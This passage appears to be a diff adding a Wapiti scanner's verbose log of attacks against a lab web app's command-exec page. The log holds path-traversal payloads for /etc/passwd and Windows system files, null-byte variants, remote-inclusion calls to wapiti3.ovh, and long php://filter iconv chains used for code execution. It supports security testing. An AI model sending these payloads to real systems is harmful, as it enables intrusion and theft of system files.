Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp
+2024-03-20 12:43:42.465 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:42.491 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:42.511 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:42.534 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:42.555 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:42.576 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:42.598 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:42.622 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:42.649 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:42.677 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:42.707 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:42.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:42.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:42.785 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:42.804 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:42.826 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:42.850 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:42.876 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:42.904 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:42.926 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:42.950 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:42.972 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:42.990 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:43.011 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=Submit%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:43.034 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=file%3A%2F%2F%2Fetc%2Fpasswd
+2024-03-20 12:43:43.067 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 12:43:43.100 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+2024-03-20 12:43:43.138 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00
+2024-03-20 12:43:43.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices
+2024-03-20 12:43:43.207 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00
+2024-03-20 12:43:43.233 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:43.259 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:43.301 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=Submit
+2024-03-20 12:43:43.305 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 12:43:43.330 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 12:43:43.352 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%2Fetc%2Fpasswd
+2024-03-20 12:43:43.372 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%2Fetc%2Fpasswd%00
+2024-03-20 12:43:43.401 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%2Fetc%2Fservices
+2024-03-20 12:43:43.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=%2Fetc%2Fservices%00
+2024-03-20 12:43:43.445 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 12:43:43.472 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 12:43:43.493 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 12:43:43.514 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:43.541 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:43.564 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 12:43:43.593 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 12:43:43.618 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 12:43:43.639 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:43.674 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:43.699 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:43.722 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:43.744 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:43.765 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:43.788 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:43.813 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:43.834 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:43.854 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:43.877 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:43.899 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:43.921 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (1)
+	data: ip=default&Submit=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-93